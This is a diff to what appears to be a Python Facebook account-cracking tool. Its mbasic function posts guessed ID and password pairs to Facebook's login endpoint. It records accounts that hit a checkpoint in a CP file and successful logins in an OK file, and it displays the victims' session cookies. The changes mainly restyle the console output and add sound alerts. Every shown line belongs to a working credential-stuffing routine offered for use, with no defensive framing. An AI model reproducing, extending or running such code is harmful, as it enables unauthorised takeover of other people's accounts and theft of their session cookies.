@@ -1521,22 +1521,24 @@ def mbasic(idf,pwv):
 			login_url = 'https://vi-vn.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzM1NzQxNzE0LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next'
 			po= ses.post(login_url, headers=head, data=data)
 			if "checkpoint" in ses.cookies.get_dict().keys():
-				cp+=1
-				tree = Tree(f" ")
-				tree.add(f"[bold yellow]{idf}|{pw}")
-				tree.add(f"[bold yellow]{ua}")
-				cetak(tree)
-				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
-				akun.append(idf + '|' + pw)
+				cp += 1
+				tree = Tree(Panel.fit(f"""{K2}{idf}|{pw}{P2}""", style=f"{color_panel}"),guide_style="bold grey100")
+				tree.add(Panel.fit(f"{K2}{tahun(idf)}{P2}", style=f"{color_panel}"))
+				tree.add(Panel(f"{K2}{ua}{P2}", style=f"{color_panel}"))
+				prints(tree)
+				os.popen("play-audio c.mp3")
+				open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
+				akun.append(idf + "|" + pw)
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
-				ok+=1
+				ok += 1
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				tree = Tree(f" ")
-				tree.add(f"[bold yellow]{idf}|{pw}")
-				tree.add(f"[bold yellow]{ua}")
-				cetak(tree)
-				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+				tree = Tree(Panel.fit(f"""{H2}{idf}|{pw}{P2}""", style=f"{color_panel}"),guide_style="bold grey100")
+				tree.add(Panel.fit(f"{H2}{tahun(idf)}{P2}", style=f"{color_panel}"))
+				tree.add(Panel(f"{H2}{kuki}{P2}", style=f"{color_panel}"))
+				prints(tree)
+				os.popen("play-audio o.mp3")
+				open("OK/" + okc, "a").write(idf + "|" + pw + "\n")
 				break
 			else:
 				continue
